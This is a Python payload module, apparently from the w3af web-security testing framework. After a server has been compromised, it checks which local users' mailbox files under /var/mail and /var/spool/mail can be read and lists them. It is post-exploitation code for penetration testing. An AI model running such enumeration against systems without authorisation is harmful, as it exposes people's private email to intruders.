from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class read_mail(Payload):
    """
    This payload shows local emails stored on /var/mail/
    """
    def fname_generator(self):
        directory_list = []
        directory_list.append('/var/mail/')
        directory_list.append('/var/spool/mail/')

        users = self.exec_payload('users')
        for directory in directory_list:
            for user in users:
                yield directory + user

    def api_read(self):
        result = {}

        file_path_iter = self.fname_generator()
        for file_path, content in self.read_multi(file_path_iter):
            if content:
                result[file_path] = 'Yes'

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'No email files could be read.'
        else:
            rows = []
            rows.append(['Email files'])
            rows.append([])
            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
